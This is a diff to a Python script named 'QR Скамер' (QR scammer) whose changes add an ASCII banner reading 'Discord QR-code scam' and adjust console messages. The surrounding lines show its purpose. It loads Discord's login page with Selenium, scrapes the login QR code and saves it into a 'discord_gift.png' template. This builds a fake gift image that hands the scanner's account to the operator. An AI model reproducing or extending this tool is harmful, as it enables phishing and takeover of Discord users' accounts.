@@ -21,8 +21,14 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('** QR Скамер **')
-    print('** By Jupiter404E **')
+    print(" ____  _                       _     ___  ____                     _")
+    print("|  _ \(_)___  ___ ___  _ __ __| |   / _ \|  _ \       ___ ___   __| | ___    ___  ___ __ _ _ __ ___")
+    print("| | | | / __|/ __/ _ \| '__/ _` |  | | | | |_) |____ / __/ _ \ / _` |/ _ \  / __|/ __/ _` | '_ ` _ \\")
+    print("| |_| | \__ \ (_| (_) | | | (_| |  | |_| |  _ <_____| (_| (_) | (_| |  __/  \__ \ (_| (_| | | | | | |")
+    print("|____/|_|___/\___\___/|_|  \__,_|   \__\_\_| \_\     \___\___/ \__,_|\___|  |___/\___\__,_|_| |_| |_|")
+    print("                                                                                                     ")
+    print("                                ▬▬▬  QR Скамер  ▬▬▬                                                  ")
+    print("                              ▬▬▬  By Jupiter404E  ▬▬▬                                             \n")
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
@@ -32,13 +38,12 @@ def main():
 
     driver.get('https://discord.com/login')
     time.sleep(5)
-    print('- Старница загружена.')
+    print('\n- Старница загружена.')
 
     page_source = driver.page_source
 
     soup = BeautifulSoup(page_source, features='lxml')
 
-    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
     qr_code = soup.find('img')['src']
     file = os.path.join(os.getcwd(), 'temp\\qr_code.png')
 
